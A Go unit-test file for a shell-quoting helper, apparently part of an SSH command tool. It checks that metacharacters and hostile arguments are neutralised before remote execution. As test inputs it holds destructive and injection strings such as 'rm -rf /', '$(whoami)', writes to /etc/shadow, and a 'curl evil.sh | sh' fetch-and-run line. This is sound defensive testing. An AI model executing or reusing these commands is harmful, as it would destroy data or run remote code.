package sshx

import (
	"errors"
	"strings"
	"testing"
)

func TestQuotePlainStaysReadable(t *testing.T) {
	for _, s := range []string{"nginx", "-t", "/etc/nginx/certs/a.pem", "systemctl", "reload", "app_1"} {
		if got := Quote(s); got != s {
			t.Errorf("Quote(%q) = %q，安全字符不应加引号", s, got)
		}
	}
}

// 这是整个模块存在的理由：任何 shell 元字符都必须失去特殊含义。
func TestQuoteNeutralizesShellMetacharacters(t *testing.T) {
	dangerous := []string{
		"; rm -rf /",
		"$(whoami)",
		"`id`",
		"a && b",
		"a || b",
		"a | tee /etc/passwd",
		"> /etc/shadow",
		"$HOME",
		"a\nb",
		"*",
		"~/secret",
		"a & b",
	}
	for _, s := range dangerous {
		q := Quote(s)
		if !strings.HasPrefix(q, "'") || !strings.HasSuffix(q, "'") {
			t.Errorf("Quote(%q) = %q，含元字符时必须整体加引号", s, q)
		}
	}
}

// 单引号是唯一需要特别处理的字符：它会提前闭合引号。
func TestQuoteHandlesEmbeddedSingleQuote(t *testing.T) {
	got := Quote("it's")
	want := `'it'\''s'`
	if got != want {
		t.Fatalf("Quote(\"it's\") = %q，期望 %q", got, want)
	}
	// 构造一个试图逃逸的输入
	escape := Quote(`'; rm -rf /; '`)
	if strings.Contains(escape, `'; rm`) && !strings.Contains(escape, `'\''`) {
		t.Fatalf("单引号逃逸未被阻断: %s", escape)
	}
}

func TestQuoteEmpty(t *testing.T) {
	if Quote("") != "''" {
		t.Fatal("空字符串必须显式引号，否则会在命令行里消失")
	}
}

func TestBuildCommand(t *testing.T) {
	got, err := BuildCommand([]string{"docker", "exec", "my nginx", "nginx", "-t"})
	if err != nil {
		t.Fatal(err)
	}
	want := "docker exec 'my nginx' nginx -t"
	if got != want {
		t.Fatalf("= %q，期望 %q", got, want)
	}
}

func TestBuildCommandRejectsEmpty(t *testing.T) {
	if _, err := BuildCommand(nil); !errors.Is(err, ErrEmptyArgv) {
		t.Fatal("空 argv 应报错")
	}
}

// 即使容器名被恶意构造，它也只能是一个参数。
func TestBuildCommandWithHostileArgument(t *testing.T) {
	got, err := BuildCommand([]string{"docker", "exec", "x; curl evil.sh | sh", "nginx", "-t"})
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(got, "; curl evil.sh | sh") && !strings.Contains(got, `'x; curl evil.sh | sh'`) {
		t.Fatalf("恶意参数未被隔离: %s", got)
	}
}

func TestExpandArgv(t *testing.T) {
	argv := []string{"docker", "exec", "{container}", "nginx", "-t"}
	got := ExpandArgv(argv, map[string]string{"container": "proj-nginx-1"})
	if got[2] != "proj-nginx-1" {
		t.Fatalf("占位符未替换: %v", got)
	}
	// 原数组不能被改动
	if argv[2] != "{container}" {
		t.Error("ExpandArgv 修改了入参")
	}
}

// 占位符的值含元字符时，展开后仍然只是参数。
func TestExpandArgvThenQuoteStaysSafe(t *testing.T) {
	argv := ExpandArgv([]string{"nginx", "-t", "{conf}"}, map[string]string{"conf": "/etc/n.conf; rm -rf /"})
	cmd, err := BuildCommand(argv)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(cmd, `'/etc/n.conf; rm -rf /'`) {
		t.Fatalf("展开后的危险值未被隔离: %s", cmd)
	}
}

func TestWithSudoIsNonInteractive(t *testing.T) {
	got := WithSudo([]string{"nginx", "-t"})
	if got[0] != "sudo" || got[1] != "-n" {
		t.Fatalf("必须用 sudo -n，否则需要密码时会挂起: %v", got)
	}
}
